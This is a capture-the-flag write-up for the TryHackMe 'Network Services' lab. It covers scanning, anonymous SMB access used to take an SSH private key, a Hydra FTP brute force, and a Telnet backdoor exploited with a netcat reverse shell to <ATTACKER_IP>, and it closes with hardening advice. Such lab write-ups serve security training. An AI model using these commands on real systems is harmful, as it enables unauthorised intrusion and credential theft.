# Network Services (TryHackMe)

1. TL;DR — Resumen Ejecutiv
1. Summary (TL;DR)

Challenge Name: Network Services (SMB, Telnet, FTP)

Difficulty: Easy / Intermediate

Key Vulnerability: Critical service misconfigurations including Anonymous Share Access, Unauthenticated Backdoors, and Insecure Protocol Usage.

Objective: Demonstrate how minor misconfigurations in legacy services can lead to complete server compromise and sensitive data exfiltration.

2. Enumeration / Reconnaissance

The foundation of any successful penetration test is thorough reconnaissance. We initiated the engagement by identifying all active entry points on the target machine.

Service Discovery

We used Nmap to perform a full TCP port scan, including service version detection and default script execution.

Command:

nmap -T4 -p- -sV -sC -Pn <TARGET_IP>


Results Table:
| Port | Protocol | Service | Version | Risk Level |
| :--- | :--- | :--- | :--- | :--- |
| 21 | TCP | FTP | vsftpd 3.0.3 | High (Info Disclosure) |
| 22 | TCP | SSH | OpenSSH 7.6p1 | Medium (Brute Force Target) |
| 139/445 | TCP | SMB | Samba 4.7.6 | Critical (Anonymous Access) |
| 8012 | TCP | Telnet | Unknown (Backdoor) | Critical (RCE) |

3. Vulnerability Analysis

SMB: The "Null Session" Flaw

The SMB service was configured to allow Anonymous Logins (Null Sessions). In a secure environment, SMB should always require valid credentials. By allowing anonymous access to the profiles share, the server leaked employee information and, more critically, private cryptographic keys.

Telnet: Unencrypted Command Execution

The service on port 8012 was identified as a Backdoor. Unlike SSH, Telnet transmits all data in plaintext. The specific implementation allowed a .RUN command, which bypasses standard authentication and executes system-level commands directly.

FTP: Weak Credential Policy

The FTP service initially allowed anonymous access to a public notice. This file leaked a valid username (mike). Because the organization lacked a Password Complexity Policy, a simple dictionary attack was sufficient to gain full access to the user's private files.

4. Exploitation Phase

Phase 1: SMB Information Extraction

Using the smbclient utility, we accessed the server without a password:

smbclient //<TARGET_IP>/profiles -N


Discovery: Identified the user directory cactus.

Exfiltration: Found a hidden .ssh folder. We downloaded the id_rsa (Private Key) to gain persistent access.

Phase 2: Telnet Reverse Shell

After confirming command execution by sniffing ICMP traffic with tcpdump, we established a stable shell:

Listener: nc -lvnp 4444

Payload Execution:

.RUN mkfifo /tmp/otdpf; nc <ATTACKER_IP> 4444 0</tmp/otdpf | /bin/sh >/tmp/otdpf


Phase 3: FTP Brute Force

Armed with the username mike, we utilized Hydra and the rockyou.txt wordlist:

hydra -l mike -P /usr/share/wordlists/rockyou.txt ftp://<TARGET_IP>


Credentials Found: mike : password

5. Post-Exploitation & Privilege Escalation

Accessing the machine via the extracted SSH key required specific handling of file permissions to satisfy the ssh client's security checks:

SSH Key Hardening:

chmod 600 id_rsa


Accessing the Target:

ssh -i id_rsa cactus@<TARGET_IP>


Flag Captured: THM{smb_is_fun_eh?}

6. Remediation & Hardening (UNI Engineering Standards)

To mitigate these risks, the following security controls must be implemented:

Service Decommissioning: Immediately disable the Telnet service on port 8012. All remote management must occur over SSH (Port 22).

SMB Hardening:

Disable Guest/Anonymous Access in smb.conf.

Restrict share access to specific authorized groups.

FTP Security:

Enforce a Strong Password Policy (minimum 12 characters, including special characters).

Enable FTPS (FTP over SSL) to encrypt data in transit.

Sensitive File Management: Never store .ssh keys or sensitive employee documents in public network shares. Implement a robust Identity and Access Management (IAM) framework.
